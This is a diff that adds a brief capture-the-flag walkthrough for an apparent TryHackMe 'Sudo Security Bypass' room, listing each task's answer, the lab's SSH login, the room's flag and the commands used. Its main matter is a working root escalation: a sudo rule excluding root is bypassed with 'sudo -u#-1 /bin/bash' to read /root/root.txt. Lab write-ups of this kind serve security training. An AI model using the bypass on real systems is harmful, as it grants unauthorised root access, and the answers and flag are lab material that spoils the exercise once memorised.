@@ -1,0 +1,22 @@
+		
+							Sudo Security Bypass
+						      ========================
+
+							   TASK:1 Deployed
+
+1. delpoyed machine
+ans: auto-complete
+
+
+							   TASK:2 Security Bypass
+
+1. What command are you allowed to run with sudo?
+ans:/bin/bash
+command: ssh -p 2222 tryhackme@{ip} (username=tryhackme, password=tryhackme)
+command: sudo -l
+
+2. What is the flag in /root/root.txt?
+ans: THM{l33t_s3cur1ty_bypass}
+command: sudo -l ((ALL, !root) NOPASSWD: /bin/bash)
+command: sudo -u#-1 /bin/bash
+command: cat /root/root.txt
